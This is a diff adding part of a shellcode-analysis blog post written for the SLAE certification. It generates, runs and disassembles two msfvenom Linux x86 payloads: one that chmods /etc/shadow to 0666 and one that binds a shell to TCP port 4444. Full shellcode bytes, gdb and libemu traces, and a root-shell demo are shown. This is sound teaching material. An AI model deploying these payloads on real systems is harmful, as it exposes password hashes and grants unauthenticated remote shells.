@@ -164,3 +164,333 @@ syscall reference [setreuid()](http://man7.org/linux/man-pages/man2/setreuid.2.h
 
 Shellcode II
 ------------
+The second shellcode we’re going to look at is `chmod`, the following are the options that needs to be feed into the payload.
+
+```sh
+root@ubuntu:~# msfvenom -p linux/x86/chmod --payload-options
+Options for payload/linux/x86/chmod:
+
+
+       Name: Linux Chmod
+     Module: payload/linux/x86/chmod
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 36
+       Rank: Normal
+
+Provided by:
+    kris katterjohn <katterjohn@gmail.com>
+
+Basic options:
+Name  Current Setting  Required  Description
+----  ---------------  --------  -----------
+FILE  /etc/shadow      yes       Filename to chmod
+MODE  0666             yes       File mode (octal)
+
+Description:
+  Runs chmod on specified file with specified mode
+```
+
+Generating shellcode using default options.
+
+```sh
+root@ubuntu:~# msfvenom -p linux/x86/chmod -f c -v shellcode
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 36 bytes
+Final size of c file: 183 bytes
+unsigned char shellcode[] = 
+"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
+"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
+"\x80\x6a\x01\x58\xcd\x80";
+root@ubuntu:~#
+```
+
+Compile and test.
+
+```sh
+root@ubuntu:~# ls -la /etc/shadow
+-rw------- 1 root shadow 1317 Jan 23 09:47 /etc/shadow
+root@ubuntu:~# gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+root@ubuntu:~# ./shellcode 
+root@ubuntu:~# ls -la /etc/shadow
+-rw-rw-rw- 1 root shadow 1317 Jan 23 09:47 /etc/shadow
+root@ubuntu:~#
+```
+
+Use `gdb` with `peda` to dump assembly code.
+
+```sh
+root@ubuntu:~# gdb -q ./shellcode
+Reading symbols from ./shellcode...(no debugging symbols found)...done.
+gdb-peda$ set disassembly-flavor intel
+gdb-peda$ break *&shellcode
+Breakpoint 1 at 0x804a040
+gdb-peda$ run
+Starting program: /root/shellcode 
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x804a040 --> 0x580f6a99 
+EBX: 0x0 
+ECX: 0xbfffee90 --> 0x1 
+EDX: 0xbfffeeb4 --> 0x0 
+ESI: 0xb7fb9000 --> 0x1b1db0 
+EDI: 0xb7fb9000 --> 0x1b1db0 
+EBP: 0xbfffee78 --> 0x0 
+ESP: 0xbfffee5c --> 0x80483f8 (<main+29>:	nop)
+EIP: 0x804a040 --> 0x580f6a99
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804a03a:	add    BYTE PTR [eax],al
+   0x804a03c:	add    BYTE PTR [eax],al
+   0x804a03e:	add    BYTE PTR [eax],al
+=> 0x804a040 <shellcode>:	cdq    
+   0x804a041 <shellcode+1>:	push   0xf
+   0x804a043 <shellcode+3>:	pop    eax
+   0x804a044 <shellcode+4>:	push   edx
+   0x804a045 <shellcode+5>:	call   0x804a056 <shellcode+22>
+[------------------------------------stack-------------------------------------]
+0000| 0xbfffee5c --> 0x80483f8 (<main+29>:	nop)
+0004| 0xbfffee60 --> 0x1 
+0008| 0xbfffee64 --> 0xbfffef24 --> 0xbffff120 ("/root/shellcode")
+0012| 0xbfffee68 --> 0xbfffef2c --> 0xbffff130 ("XDG_VTNR=7")
+0016| 0xbfffee6c --> 0x804a040 --> 0x580f6a99 
+0020| 0xbfffee70 --> 0xb7fb93dc --> 0xb7fba1e0 --> 0x0 
+0024| 0xbfffee74 --> 0xbfffee90 --> 0x1 
+0028| 0xbfffee78 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804a040 in shellcode ()
+gdb-peda$ disassemble $eip, +35
+Dump of assembler code from 0x804a040 to 0x804a063:
+=> 0x0804a040 <shellcode+0>:	cdq    
+   0x0804a041 <shellcode+1>:	push   0xf
+   0x0804a043 <shellcode+3>:	pop    eax
+   0x0804a044 <shellcode+4>:	push   edx
+   0x0804a045 <shellcode+5>:	call   0x804a056 <shellcode+22>
+   0x0804a04a <shellcode+10>:	das    
+   0x0804a04b <shellcode+11>:	gs je  0x804a0b1
+   0x0804a04e <shellcode+14>:	das    
+   0x0804a04f <shellcode+15>:	jae    0x804a0b9
+   0x0804a051 <shellcode+17>:	popa   
+   0x0804a052 <shellcode+18>:	outs   dx,DWORD PTR fs:[esi]
+   0x0804a054 <shellcode+20>:	ja     0x804a056 <shellcode+22>
+   0x0804a056 <shellcode+22>:	pop    ebx
+   0x0804a057 <shellcode+23>:	push   0x1b6
+   0x0804a05c <shellcode+28>:	pop    ecx
+   0x0804a05d <shellcode+29>:	int    0x80
+   0x0804a05f <shellcode+31>:	push   0x1
+   0x0804a061 <shellcode+33>:	pop    eax
+   0x0804a062 <shellcode+34>:	int    0x80
+End of assembler dump.
+```
+
+Analyze code line by line using the comments section.
+
+![](/assets/images/Disecting_Msfvenom_Shellcode_Linux_x86/chmod.png)
+
+syscall reference [chmod()](http://man7.org/linux/man-pages/man2/chmod.2.html) and [exit()](http://man7.org/linux/man-pages/man3/exit.3.html).
+
+Shellcode III
+-------------
+The third and last shellcode we’re going to dissect is `shell_bind_tcp`, let’s check payload options:
+
+```sh
+root@ubuntu:~# msfvenom -p linux/x86/shell_bind_tcp --payload-options
+Options for payload/linux/x86/shell_bind_tcp:
+
+
+       Name: Linux Command Shell, Bind TCP Inline
+     Module: payload/linux/x86/shell_bind_tcp
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 78
+       Rank: Normal
+
+Provided by:
+    Ramon de C Valle <rcvalle@metasploit.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LPORT  4444             yes       The listen port
+RHOST                   no        The target address
+
+Description:
+  Listen for a connection and spawn a command shell
+```
+
+Generating shellcode.
+
+```sh
+root@ubuntu:~# msfvenom -p linux/x86/shell_bind_tcp RHOST=127.0.0.1 -f c -v shellcode
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 78 bytes
+Final size of c file: 360 bytes
+unsigned char shellcode[] = 
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
+"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
+"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
+"\x0b\xcd\x80";
+root@ubuntu:~#
+```
+
+Compile and test.
+
+```sh
+root@ubuntu:~# gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+root@ubuntu:~# ./shellcode 
+^Z
+[2]+  Stopped                 ./shellcode
+root@ubuntu:~# bg
+[2]+ ./shellcode &
+root@ubuntu:~# nc -nv 127.0.0.1 4444
+Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Use `libemu` to dump assembly code.
+
+```sh
+root@ubuntu:~# msfvenom -p linux/x86/shell_bind_tcp RHOST=127.0.0.1 -f raw | sctest -S -s 100000 -vvv
+verbose = 3
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 78 bytes
+*
+s
+n
+i
+p
+*
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int bind (
+     int sockfd = 14;
+     struct sockaddr_in * my_addr = 0x00416fc2 => 
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 23569 (port=4444);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 0 (host=0.0.0.0);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 16;
+) =  0;
+int listen (
+     int s = 14;
+     int backlog = 0;
+) =  0;
+int accept (
+     int sockfd = 14;
+     sockaddr_in * addr = 0x00000000 => 
+         none;
+     int addrlen = 0x00000010 => 
+         none;
+) =  19;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 14;
+) =  14;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 13;
+) =  13;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 12;
+) =  12;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 11;
+) =  11;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 10;
+) =  10;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 9;
+) =  9;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 8;
+) =  8;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 7;
+) =  7;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 6;
+) =  6;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 5;
+) =  5;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 4;
+) =  4;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 3;
+) =  3;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 2;
+) =  2;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 1;
+) =  1;
+int dup2 (
+     int oldfd = 19;
+     int newfd = 0;
+) =  0;
+int execve (
+     const char * dateiname = 0x00416fb2 => 
+           = "/bin//sh";
+     const char * argv[] = [
+           = 0x00416faa => 
+               = 0x00416fb2 => 
+                   = "/bin//sh";
+           = 0x00000000 => 
+             none;
+     ];
+     const char * envp[] = 0x00000000 => 
+         none;
+) =  0;
+```
+
+Analyze code line by line using the comments section.
+
+![](/assets/images/Disecting_Msfvenom_Shellcode_Linux_x86/BindShell.png)
+
+syscall reference [socketcall()](http://man7.org/linux/man-pages/man2/socketcall.2.html), [dup2()](http://man7.org/linux/man-pages/man2/dup.2.html), and [execute()](http://man7.org/linux/man-pages/man2/execve.2.html).
+
+Closing Thoughts
+----------------
+Stepping through `msfvenom` shellcode taught me few behind the scene tricks, also it cleared my doubts in terms of how some of the commands actually work and hope you learned something too!  Feel free to contact me for questions via twitter [@ihack4falafel](https://twitter.com/ihack4falafel).
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
+
+Student ID: SLAE-1115
+
+Github Repo: [https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%205](https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%205)
